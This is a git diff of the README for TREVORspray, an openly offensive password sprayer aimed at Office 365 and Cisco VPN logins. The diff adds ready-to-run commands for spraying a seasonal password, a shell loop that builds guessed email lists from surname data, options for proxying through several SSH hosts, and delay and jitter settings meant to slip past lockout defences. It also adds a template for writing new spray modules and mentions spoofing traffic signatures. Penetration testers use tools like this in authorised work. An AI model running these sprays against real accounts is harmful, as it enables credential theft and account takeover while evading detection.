@@ -1,19 +1,23 @@
-# TREVORspray
-TREVORspray is a featureful Microsoft 365 password sprayer based on [MSOLSpray](https://github.com/dafthack/MSOLSpray) 
+# TREVORspray 2.0
+TREVORspray is a modular password sprayer with threading, SSH proxying, loot modules, and more!
 
 By [@thetechr0mancer](https://twitter.com/thetechr0mancer)
 
 ![trevorspray](https://user-images.githubusercontent.com/20261699/92338226-e366d680-f07c-11ea-8664-7b320783dc98.png)
 
 ## Features
+- Supported modules:
+  - `msol` (Office 365)
+  - `anyconnect` (Cisco VPN)
+  - See below for how to create your own
 - Tells you the status of each account: if it exists, is locked, has MFA enabled, etc.
 - Automatic cancel/resume (remembers already-tried user/pass combos in `~/.trevorspray/tried_logins.txt`)
-- Round-robin proxy through multiple IPs using only vanilla `--ssh`
+- Round-robin proxy through multiple IPs with `--ssh`
 - Automatic infinite reconnect/retry if a proxy goes down (or if you lose internet)
-- Spoofs `User-Agent` and `client_id` to look like legitimate auth traffic
+- Spoofs `User-Agent` and other signatures to look like legitimate auth traffic
 - Logs everything to `~/.trevorspray/trevorspray.log`
 - Saves valid usernames to `~/.trevorspray/valid_usernames.txt`
-- Optional `--delay` between request to bypass M$ lockout countermeasures
+- Optional `--delay` and `--jitter` between request to bypass lockout countermeasures
 
 ## Installation:
 ```
@@ -22,7 +26,7 @@ $ cd trevorspray
 $ pip install -r requirements.txt
 ```
 
-## How To
+## How To - O365
 - First, get a list of emails for `corp.com` and perform a spray to see if the default configuration works. Usually it does.
 - If TREVORspray says the emails in your list don't exist, don't give up. Get the `token_endpoint` with `--recon corp.com`. The `token_endpoint` is the URL you'll be spraying against (with the `--url` option).
 - It may take some experimentation before you find the right combination of `token_endpoint` + email format.
@@ -39,31 +43,51 @@ trevorspray.py --recon evilcorp.com
 
 ## Example: Spray against discovered "token_endpoint" URL
 ```bash
-trevorspray.py -e emails.txt -p Fall2021! --url https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token
+trevorspray.py -u emails.txt -p 'Fall2021!' --url https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token
 ```
 
 ## Example: Spray with 5-second delay between requests
 ```bash
-trevorspray.py -e bob@evilcorp.com -p Fall2021! --delay 5
+trevorspray.py -u bob@evilcorp.com -p 'Fall2021!' --delay 5
 ```
 
 ## Example: Spray and round-robin between 3 IPs (the current IP is also used, unless `-n` is specifiied)
 ```bash
-trevorspray.py -e emails.txt -p Fall2021! --ssh root@1.2.3.4 root@4.3.2.1
+trevorspray.py -u emails.txt -p 'Fall2021!' --ssh root@1.2.3.4 root@4.3.2.1
+```
+
+## Example: Find valid usernames without OSINT >:D
+```bash
+# clone wordsmith dataset
+wget https://github.com/skahwah/wordsmith/releases/download/v2.1.1/data.tar.xz && tar -xvf data.tar.xz && cd data
+
+# order first initial by occurrence
+ordered_letters=asjmkdtclrebnghzpyivfowqux
+
+# loop through first initials
+echo -n $ordered_letters | while read -n1 f; do
+  # loop through top 2000 USA last names
+  head -n 2000 'usa/lnames.txt' | while read last; do
+    # generate emails in f.last format
+    echo "${f}.${last}@evilcorp.com"
+  done
+done | tee f.last.txt
+
+trevorspray.py -e f.last.txt -p 'Fall2021!'
 ```
 
 ## TREVORspray - Help:
 ```
 $ ./trevorspray.py --help
-usage: trevorspray.py [-h] [-e EMAILS [EMAILS ...]] [-p PASSWORDS [PASSWORDS ...]] [-r DOMAIN [DOMAIN ...]] [-f] [-d DELAY] [-u URL] [-v] [-s USER@SERVER [USER@SERVER ...]] [-k KEY]
-                      [-b BASE_PORT] [-n]
+usage: trevorspray [-h] [-u USERS [USERS ...]] [-p PASSWORDS [PASSWORDS ...]] [-r DOMAIN [DOMAIN ...]] [-f] [-d DELAY] [-j JITTER] [--url URL] [-v] [-s USER@SERVER [USER@SERVER ...]]
+                   [-i KEY] [-b BASE_PORT] [-n] [-nl] [-m {anyconnect,msol}] [-t TIMEOUT]
 
 Execute password sprays against O365, optionally proxying the traffic through SSH hosts
 
 optional arguments:
   -h, --help            show this help message and exit
-  -e EMAILS [EMAILS ...], --emails EMAILS [EMAILS ...]
-                        Emails(s) and/or file(s) filled with emails
+  -u USERS [USERS ...], --users USERS [USERS ...]
+                        Usernames(s) and/or file(s) containing usernames
   -p PASSWORDS [PASSWORDS ...], --passwords PASSWORDS [PASSWORDS ...]
                         Password(s) that will be used to perform the password spray
   -r DOMAIN [DOMAIN ...], --recon DOMAIN [DOMAIN ...]
@@ -71,48 +95,80 @@ optional arguments:
   -f, --force           Forces the spray to continue and not stop when multiple account lockouts are detected
   -d DELAY, --delay DELAY
                         Sleep for this many seconds between requests
-  -u URL, --url URL     The URL to spray against (default is https://login.microsoft.com)
-  -v, --verbose         Show which proxy is being used for each request
+  -j JITTER, --jitter JITTER
+                        Add a random delay of up to this many seconds between requests
+  --url URL             The URL to spray against
+  -v, --verbose, --debug
+                        Show which proxy is being used for each request
   -s USER@SERVER [USER@SERVER ...], --ssh USER@SERVER [USER@SERVER ...]
                         Round-robin load-balance through these SSH hosts (user@host) NOTE: Current IP address is also used once per round
-  -k KEY, --key KEY     Use this SSH key when connecting to proxy hosts
+  -i KEY, -k KEY, --key KEY
+                        Use this SSH key when connecting to proxy hosts
   -b BASE_PORT, --base-port BASE_PORT
                         Base listening port to use for SOCKS proxies
   -n, --no-current-ip   Don't spray from the current IP, only use SSH proxies
+  -nl, --no-loot        Don't execute loot activites for valid accounts
+  -m {anyconnect,msol}, --module {anyconnect,msol}
+                        Spray module to use (default: msol)
+  -t TIMEOUT, --timeout TIMEOUT
+                        Connection timeout in seconds (default: 10)
 ```
 
-## Known Limitations:
-- Untested on Windows
+## Writing Spray Modules
+Writing modules is pretty straightforward. Create a new `.py` file in `lib/sprayers` (e.g. `lib/sprayers/example.py`), and specify the HTTP method and any other parameters
+~~~python
+from .base import BaseSprayModule
 
+class SprayModule(BaseSprayModule):
 
-# TREVORproxy
-TREVORproxy is a SOCKS proxy that round-robins requests through SSH hosts. Note that TREVORspray already has its own proxy feature (`--ssh`), so this is for use with curl, Burpsuite, etc.
+    # HTTP method
+    method = 'POST'
+    # default target URL
+    default_url = 'https://login.evilcorp.com/'
+    # body of request
+    body = 'user={username}&pass={password}&group={otherthing}'
+    # HTTP headers
+    headers = {}
+    # HTTP cookies
+    cookies = {}
+    # Don't count nonexistent accounts as failed logons
+    fail_nonexistent = False
 
-## TREVORproxy - Help:
-```
-$ ./trevorproxy.py --help
-usage: trevorproxy.py [-h] [-p PORT] [-l LISTEN_ADDRESS] [-v] [-k KEY] [--base-port BASE_PORT] ssh_hosts [ssh_hosts ...]
+    headers = {
+        'User-Agent': 'Your Moms Vibrator',
+    }
 
-Spawns a SOCKS server which round-robins requests through the specified SSH hosts
+    def initialize(self):
+        '''
+        Prep for 
+        '''
+        self.miscparams = {
+            'otherthing': input('What is the other thing?')
+        }
+        return True
 
-positional arguments:
-  ssh_hosts             Round-robin load-balance through these SSH hosts (user@host)
+    def check_response(self, response):
+        '''
+        returns (valid, exists, locked, msg)
+        '''
 
-optional arguments:
-  -h, --help            show this help message and exit
-  -p PORT, --port PORT  Port for SOCKS server to listen on (default: 1080)
-  -l LISTEN_ADDRESS, --listen-address LISTEN_ADDRESS
-                        Listen address for SOCKS server (default: 127.0.0.1)
-  -v, --verbose         Print extra debugging info
-  -k KEY, --key KEY     Use this SSH key when connecting to proxy hosts
-  --base-port BASE_PORT
-                        Base listening port to use for SOCKS proxies
-```
+        valid = False
+        exists = None
+        locked = None
+        msg = ''
+
+        if getattr(response, 'status_code', 0) == 200:
+            valid = True
+            exists = True
+            msg = 'Valid cred'
+
+        return (valid, exists, locked, msg)
+~~~
 
 CREDIT WHERE CREDIT IS DUE - MANY THANKS TO:
 - [@dafthack](https://twitter.com/dafthack) for writing [MSOLSpray](https://github.com/dafthack/MSOLSpray)
 - [@Mrtn9](https://twitter.com/Mrtn9) for his Python port of [MSOLSpray](https://github.com/MartinIngesen/MSOLSpray)
-- [@KnappySqwurl](https://twitter.com/KnappySqwurl) for being a splunk wizard and showing me how heckin loud I was being :)
+- [@KnappySqwurl](https://twitter.com/KnappySqwurl) for being a splunk wizard
 
 ![trevor](https://user-images.githubusercontent.com/20261699/92336575-27071380-f070-11ea-8dd4-5ba42c7d04b7.jpeg)
 
